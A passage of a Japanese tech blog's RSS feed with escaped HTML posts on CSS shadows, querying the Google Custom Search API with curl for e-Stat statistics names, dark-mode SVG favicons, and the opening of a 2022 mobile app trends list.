&lt;span class="nt">43px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">225&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">73&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">57&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">92&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">44px&lt;/span> &lt;span class="nt">44px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">225&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">73&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">58&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">93&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">45px&lt;/span> &lt;span class="nt">45px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">226&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">74&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">58&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">94&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">46px&lt;/span> &lt;span class="nt">46px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">227&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">74&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">58&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">95&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">47px&lt;/span> &lt;span class="nt">47px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">228&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">75&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">59&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">96&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">48px&lt;/span> &lt;span class="nt">48px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">229&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">75&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">59&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">97&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">49px&lt;/span> &lt;span class="nt">49px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">230&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">75&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">59&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">98&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">50px&lt;/span> &lt;span class="nt">50px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">230&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">76&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">60&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">99&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="要素に影をつける">要素に影をつける&lt;/h3>
&lt;p>box-shadowプロパティは、HTML要素に影を適用するために使用されます。&lt;/p>
&lt;p>box-shadowの構文は下記になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">box-shadow&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="nt">横方向のオフセット&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="nt">縦方向のオフセット&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="nt">ぼかしの量&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="nt">影の広がり&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nt">オプション&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="nt">色&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ぼかし、広がり、色のパラメーターはオプションです。&lt;br>
実際の記述は次のようになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">box-shadow&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">35&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="nt">0px&lt;/span> &lt;span class="nt">5px&lt;/span> &lt;span class="nt">15px&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この記事で使用されている完全なソースコードを確認したい場合は、&lt;a class="link" href="https://github.com/Yuvrajchandra/CSS-Tips-And-Tricks" target="_blank" rel="noopener"
>GitHubリポジトリ&lt;/a>をご覧ください。&lt;/p>
&lt;p>WebサイトにCSSのテキストシャドウを追加することは、ユーザーの注意を引くのに最適な方法です。Webサイトにある種のエレガンスとユニークな雰囲気を与えることができます。あなたのサイトのテーマに合うようなテキストシャドウの例を、創造力を働かせて試してみてください。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>いかがだったでしょうか。いままでJSを使ってやっていたことが実はCSSでも可能になっているケースが多いです。&lt;br>
javascript記述するよりも、cssのほうが軽量です。&lt;br>
ぜひ皆さんのサイトにも導入してUI、UXの向上につなげてみてください。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/HTML5-CSS3-%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e3%83%ac%e3%82%b7%e3%83%94%e9%9b%86-%e7%8b%a9%e9%87%8e-%e7%a5%90%e6%9d%b1/dp/4774187801/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51Xd7nz7WbL.jpg" alt=" HTML5 &amp;amp; CSS3 デザインレシピ集 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> HTML5 &amp;amp; CSS3 デザインレシピ集 &lt;/h2>
&lt;p> 本書は、HTML5とCSS3によるWebサイト制作のための&amp;#34;おいしい&amp;#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/HTML5%ef%bc%8bCSS3%e3%81%ae%e6%96%b0%e3%81%97%e3%81%84%e6%95%99%e7%a7%91%e6%9b%b8-%e6%94%b9%e8%a8%82%e6%96%b0%e7%89%88-%e5%9f%ba%e7%a4%8e%e3%81%8b%e3%82%89%e8%a6%9a%e3%81%88%e3%82%8b%e3%80%81%e6%b7%b1%e3%81%8f%e7%90%86%e8%a7%a3%e3%81%a7%e3%81%8d%e3%82%8b%e3%80%82-%e8%b5%a4%e9%96%93-%e5%85%ac%e5%a4%aa%e9%83%8e-ebook/dp/B07GPH7R3Y/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41eG3HJF4pL.jpg" alt=" HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 &lt;/h2>
&lt;p> この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5&amp;#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>e-Stat でGoogle Custom Search APIを使おう（１）</title><link>https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/</link><pubDate>Wed, 19 Jan 2022 00:31:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/anal.jpg" alt="Featured image of post e-Stat でGoogle Custom Search APIを使おう（１）" />&lt;h2 id="統計名でgoogle検索して関心度の高いキーワードを抽出しよう">統計名でgoogle検索して関心度の高いキーワードを抽出しよう&lt;/h2>
&lt;p>e-Statの解析の目標として、膨大な統計データの中から一般の人に関心度の高いものを抽出してデータを要約したいと考えています。&lt;br>
google検索で上位にくるものは関心度が高いと言えるでしょうから統計名でgoogle検索して関心度の高いキーワードを抽出したいと思います。&lt;br>
google検索を自動でするためにGoogle Custom Search APIを使います。&lt;br>
Google Custom Search API は１日１００回までは無料で、それ以上だと１０００回につき５ドル課金されるみたいです。&lt;br>
&lt;a class="link" href="https://developers.google.com/custom-search/v1/overview#pricing" target="_blank" rel="noopener"
>https://developers.google.com/custom-search/v1/overview#pricing&lt;/a>&lt;br>
１日に発表される統計は10個いかないくらいなので無料の範囲で使えそうです。&lt;br>
Google Custom Search APIを使ってみましょう。&lt;/p>
&lt;h2 id="google-custom-search-api-を使えるように設定する2022年1月時点">Google Custom Search API を使えるように設定する（2022年1月時点)&lt;/h2>
&lt;p>以下の手順で設定します。&lt;br>
・googleアカウントを取得する&lt;br>
gmailのメールアドレスです。&lt;br>
・Google Cloud Platformでクレジットカード情報を登録する&lt;br>
&lt;a class="link" href="https://console.cloud.google.com/billing/create?hl=ja" target="_blank" rel="noopener"
>https://console.cloud.google.com/billing/create?hl=ja&lt;/a>&lt;br>
・プロジェクトを作成する&lt;br>
&lt;a class="link" href="https://console.cloud.google.com/projectcreate" target="_blank" rel="noopener"
>https://console.cloud.google.com/projectcreate&lt;/a>&lt;br>
・認証情報を作成する&lt;br>
&lt;a class="link" href="https://console.cloud.google.com/apis/credentials" target="_blank" rel="noopener"
>https://console.cloud.google.com/apis/credentials&lt;/a>&lt;br>
「+認証情報を作成」をクリックして「APIキー」を選択すると&lt;br>
APIキーが作成されますのでコピーしておきましょう&lt;br>
・APIキーの利用制限&lt;br>
キーの制限をクリックしてAPIキーの利用を制限しておきましょう&lt;br>
接続元が固定のIPアドレスを持っているなら「アプリケーションの制限」でIPアドレスを設定しましょう。&lt;br>
APIの制限もとりあえすCustom Search API １個にしときます。&lt;br>
保存ボタンをクリックします&lt;br>
・Custom Search API を有効にする&lt;/p>
&lt;pre tabindex="0">&lt;code>https://console.cloud.google.com/apis/library/customsearch.googleapis.com
&lt;/code>&lt;/pre>&lt;p>「有効にする」ボタンをクリックします。&lt;br>
・検索エンジンIDの取得&lt;br>
&lt;a class="link" href="https://cse.google.com/create/new" target="_blank" rel="noopener"
>https://cse.google.com/create/new&lt;/a>&lt;br>
検索するサイトは「www.google.co.jp（後で削除するので適当で良いです）」&lt;br>
言語は「日本語」&lt;br>
検索エンジンの名前は適当で良いです。&lt;br>
左側の設定ボタンを押すと画面中央中段に「検索エンジンID」があるのでコピーします。&lt;br>
検索するサイトをで「www.google.co.jp」を「削除」します&lt;br>
「ウェブ全体を検索」を「オン」にします&lt;/p>
&lt;h2 id="curlでgoogle-custom-search-api検索する">CurlでGoogle Custom Search API検索する&lt;/h2>
&lt;p>試しに検索してみましょう。&lt;br>
curlを利用します。&lt;br>
curlでAPIキー、検索エンジンID、キーワードを指定して検索します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl 'https://www.googleapis.com/customsearch/v1?key=google apiキー&amp;amp;cx=検索エンジン ID&amp;amp;q=検索キーワード'
&lt;/code>&lt;/pre>&lt;p>「木材流通統計調査」で検索してみました。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl 'https://www.googleapis.com/customsearch/v1?key=google apiキー&amp;amp;cx=検索エンジンID&amp;amp;q=木材流通統計調査'
&lt;/code>&lt;/pre>&lt;p>結果はjsonで返ってきます。&lt;br>
見た感じ、ブラウザのgoogle検索の結果と同じ感じなので良さそうですね。&lt;/p>
&lt;pre tabindex="0">&lt;code> &amp;quot;items&amp;quot;: [
{
&amp;quot;kind&amp;quot;: &amp;quot;customsearch#result&amp;quot;,
&amp;quot;title&amp;quot;: &amp;quot;木材流通統計調査：農林水産省&amp;quot;,
&amp;quot;htmlTitle&amp;quot;: &amp;quot;\u003cb\u003e木材流通統計調査\u003c/b\u003e：農林水産省&amp;quot;,
&amp;quot;link&amp;quot;: &amp;quot;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/&amp;quot;,
&amp;quot;displayLink&amp;quot;: &amp;quot;www.maff.go.jp&amp;quot;,
&amp;quot;snippet&amp;quot;: &amp;quot;木材流通構造調査, 木材の販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び木材チップ製造用機械の所有状況、 ...&amp;quot;,
&amp;quot;htmlSnippet&amp;quot;: &amp;quot;\u003cb\u003e木材流通\u003c/b\u003e構造\u003cb\u003e調査\u003c/b\u003e, \u003cb\u003e木材\u003c/b\u003eの販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び\u003cb\u003e木材\u003c/b\u003eチップ製造用機械の所有状況、&amp;amp;nbsp;...&amp;quot;,
&amp;quot;cacheId&amp;quot;: &amp;quot;cMExMff56bgJ&amp;quot;,
&amp;quot;formattedUrl&amp;quot;: &amp;quot;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/&amp;quot;,
&amp;quot;htmlFormattedUrl&amp;quot;: &amp;quot;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/&amp;quot;,
&amp;quot;pagemap&amp;quot;: {
&amp;quot;cse_thumbnail&amp;quot;: [
{
&amp;quot;src&amp;quot;: &amp;quot;https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSmlCF9ltcQbjL9DAnpZfJIotIT2ej4cd_YfBfs5ew-v2FR_NxjLAGdFTTI&amp;quot;,
&amp;quot;width&amp;quot;: &amp;quot;200&amp;quot;,
&amp;quot;height&amp;quot;: &amp;quot;200&amp;quot;
}
],
&amp;quot;metatags&amp;quot;: [
{
&amp;quot;viewport&amp;quot;: &amp;quot;width=device-width, initial-scale=1&amp;quot;,
&amp;quot;format-detection&amp;quot;: &amp;quot;telephone=no&amp;quot;
}
],
&amp;quot;cse_image&amp;quot;: [
{
&amp;quot;src&amp;quot;: &amp;quot;https://www.maff.go.jp/j/shared_new/shared/images/icon_pnavi@2x.png&amp;quot;
}
]
}
},
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 128;
flex-basis: 307px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/search.png" data-size="880x686">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/search.png"
width="880"
height="686"
loading="lazy"
alt="検索結果"
>
&lt;/a>
&lt;/a>
&lt;figcaption>検索結果&lt;/figcaption>
&lt;/figure>&lt;/p></description></item><item><title>ファビコンは1サイズのみ！さらにダークモード対応させる</title><link>https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/</link><pubDate>Tue, 18 Jan 2022 17:17:37 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/catch.jpg" alt="Featured image of post ファビコンは1サイズのみ！さらにダークモード対応させる" />&lt;p>最近ダークモードと呼ばれる機能に対応したアプリが増え、それと同じようにWebサイトでもダークモードに対応しているものを見かけるようになりました。&lt;/p>
&lt;p>今回はWebサイトの中でファビコンを1サイズで用意して、さらにそのファビコンをダークモードに対応させてみたいと思います。&lt;/p>
&lt;h2 id="ダークモードって何">ダークモードって何？&lt;/h2>
&lt;p>ダークモードとは画面の色を反転して表示するスマホやタブレットに追加された機能となります。&lt;br>
iPhoneやiPadなどが先行iOS13のリリースの際に実装しました。&lt;br>
たとえば、一般的なアプリの背景は白だったかと思いますが、ダークモードをオンにしているときは背景の色が暗めの配色となり、文字色が反対に明るめの配色になったりします。&lt;br>
この機能は光が抑えられるため、目に優しかったりすると言われてます。さらに、画面の発光を抑えられるため、バッテリーの持ちも良くなるとのことでした。&lt;/p>
&lt;p>このダークモード機能がMacやWindowsなどのパソコンでも使用可能となり、それに伴ってブラウザでも使えるようになりました。&lt;/p>
&lt;h3 id="webサイトをダークモードに対応">WEBサイトをダークモードに対応&lt;/h3>
&lt;p>Webサイトを構築する際に、今までのCSSは下記のような記述になっていたかと思います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css"> &lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#FFF&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#000&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>背景を白にして、文字色を黒にするといったような記述です。&lt;br>
この場合、ダークモードに対応した端末で見た場合に、ダークモードがONであるにもかかわらず、背景が白のサイトが表示されてしまいます。&lt;/p>
&lt;p>これをダークモードに対応させると、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">@&lt;/span>&lt;span class="k">media&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nt">prefers-color-scheme&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">dark&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#000&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記のCSSのように &lt;code>@media (prefers-color-scheme: dark)&lt;/code> を追記して、ダークモードの場合は別のCSSで上書きをしてやる必要があります。&lt;/p>
&lt;p>実はこの機能を使うことで、ファビコンも色を変えて、ダークモードに対応させることができてしまうのです。&lt;/p>
&lt;h2 id="ファビコンは1つ">ファビコンは1つ&lt;/h2>
&lt;p>今まで、ファビコンは大量に設置する必要がありました。&lt;br>
全部設置仕様となると、50個近くのファイルを読み込んで、metaに記述する必要がありました。&lt;br>
そんな手間をしたくないと思います。&lt;br>
そもそも、そんなに大量のファビコンは必要でしょうか？&lt;/p>
&lt;p>モダンブラウザと呼ばれる最新のブラウザのみに対応であればファビコンは1つで十分です。&lt;br>
「サイズごとに用意する必要があるのに、そんなことないだろ」と思われるかもしれませんが、近年のブラウザはSVGと呼ばれる形式の画像に対応しております。&lt;br>
この画像は従来のピクセルデータではなく、ベクターデータと呼ばれる座標で画像を構築してます。&lt;br>
座標データなので、縮小、拡大しても画質は綺麗なままです。&lt;/p>
&lt;p>それではSVGでファビコンを作ったらどうでしょうか？&lt;br>
そうです。大量のサイズを用意しないで、1ファイルでファビコンを用意できてしまうのです。&lt;/p>
&lt;h3 id="ファビコンを設置">ファビコンを設置&lt;/h3>
&lt;p>ファビコンをIllustratorやXDで作成して、SVG形式で保存します。&lt;br>
作成したファビコンをWebサイトに反映します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">link&lt;/span> &lt;span class="na">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;icon&amp;#34;&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;favicon.svg&amp;#34;&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;image/svg+xml&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>head部分に上記の&lt;code>link&lt;/code>タグを記述します。hrefの部分は適宜変更してください。&lt;br>
これでファビコンをSVG化することができました。&lt;/p>
&lt;h3 id="ファビコンをダークモードに対応させる">ファビコンをダークモードに対応させる&lt;/h3>
&lt;p>ダークモードに対応させるためにはもうひと工夫必要です。さきほど作成したファイルを開いて、CSSのスタイルを追加します。&lt;br>
Illustratorで色を塗っていた場合、styleタグに色情報が記述されているかと思います。&lt;br>
そこに、&lt;code>@media (prefers-color-scheme: dark)&lt;/code> でダークモードの際の色を指定します。&lt;br>
&lt;code>fill&lt;/code>はSVGの塗りつぶしを意味してます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nt">style&lt;/span> &lt;span class="nt">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;text/css&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">st0&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="n">fill&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#34495E&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">@&lt;/span>&lt;span class="k">media&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nt">prefers-color-scheme&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">dark&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">st0&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="n">fill&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="n">FFF&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="nt">style&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これでfaviconもダークモード対応できました。&lt;br>
実際にブウラウザでアクセスして、ダークモードを切り替えると確認できるかと思います。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>今まで大量のfaviconを用意して、metaタグに記述していましたが、モダンブラウザになると、SVGファイル1つでさまざまなサイズに対応可能です。しかも画質がきれいなので、高画素端末で見ても安心です。&lt;br>
さらに、SVGファイルのファビコンであればファイル自体にcssのスタイルを記述できるので、&lt;code>@media (prefers-color-scheme: dark)&lt;/code> を使ってダークモードに対応することもできます。&lt;br>
こうした小さなUI、UXの改善がウェブサイトの大きな改善につながるのではないかと思います。&lt;br>
みなさんも、ぜひダークモードに対応したおしゃれなファビコンを設置してみませんか？&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%83%96%e3%83%a9%e3%83%b3%e3%83%87%e3%82%a3%e3%83%b3%e3%82%b0%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e3%81%ae%e6%95%99%e7%a7%91%e6%9b%b8-%e8%a5%bf%e6%be%a4-%e6%98%8e%e6%b4%8b/dp/4756252524/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/41EKomzrUQL.jpg" alt=" ブランディングデザインの教科書 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> ブランディングデザインの教科書 &lt;/h2>
&lt;p> 企業経営に役立つ「ブランディング」と「デザイン」がこの1冊で一気にわかる!
ブランディング成功の秘訣とは──。
これからブランディングをはじめたい経営者やプランナー、ブランド全体をデザインしてみたいというデザイナーや学生の方に向け、100以上のブランド開発実績を持つブランディングデザイナー西澤明洋が「ブランディング」と「デザイン」の方法を徹底解説。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/ICONISM-%e4%b8%96%e7%95%8c%e3%81%ae%e3%82%a2%e3%82%a4%e3%82%b3%e3%83%b3%e3%83%bb%e3%83%94%e3%82%af%e3%83%88%e3%82%b0%e3%83%a9%e3%83%a0%e3%81%ae%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3-Sandu-Publishing/dp/4756254853/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/419GLprboML.jpg" alt=" ICONISM 世界のアイコン・ピクトグラムのデザイン ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> ICONISM 世界のアイコン・ピクトグラムのデザイン &lt;/h2>
&lt;p> 情報をわかりやすく効果的に伝えるデザインと活用例が満載! アイコンやピクトグラムは、ガイドサインだけでなく、ブランディングやウェブサイト・アプリなど現代生活のあらゆる場面で、コミュニケーションを円滑にするためますます重要な役割を担っています。世界各国の優れたデザインと展開実例を用途別に集めた1冊です。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>2022年に注目すべきモバイルアプリ開発トレンド 15選</title><link>https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/</link><pubDate>Mon, 17 Jan 2022 18:11:53 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/catch.jpg" alt="Featured image of post 2022年に注目すべきモバイルアプリ開発トレンド 15選" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://www.netsolutions.com/insights/12-mobile-app-development-trends-to-watch-out-for-in-2019/" target="_blank" rel="noopener"
>Top 15 Mobile App Development Trends to Watch for in 2022&lt;/a>&lt;/p>
&lt;p>モバイルアプリ開発業界は、驚異的なスピードで進化しています。このデジタルダーウィン時代に生き残り、繁栄するには、変化するモバイルアプリ開発のトレンドに精通する必要があります。 今日、スマートフォンはデジタルメディアの成功の鍵です。これは、ビジネスモデル、運用モデル、および市場を驚くべき速度で根本的に変革します。 2022年までに、モバイルアプリ市場の収益は6,930億ドルに達すると予想されています。&lt;/p>
&lt;p>ただし、ほとんどのアプリは失敗してしまっているであるということです。&lt;/p>
&lt;p>この失敗の主な理由は、最新のモバイルアプリテクノロジーのトレンドを追跡および実装できないことです。または、より技術的に適応力のある競合他社に負ける結果になります。&lt;/p>
&lt;p>モバイルアプリを成功させるための最初のステップは、2022年のモバイルアプリ開発のトレンドを常に把握することです。これらの最新のトレンドのいくつかについて詳しく説明しましょう。&lt;/p>
&lt;p>モバイルアプリ開発の新しいトレンドが数多く出現していますが、ここでは、詳細な事実に基づいた調査の結果、モバイルアプリ開発のトレンドのTOP15を取り上げました。&lt;/p>
&lt;h2 id="5gの台頭">5Gの台頭&lt;/h2>
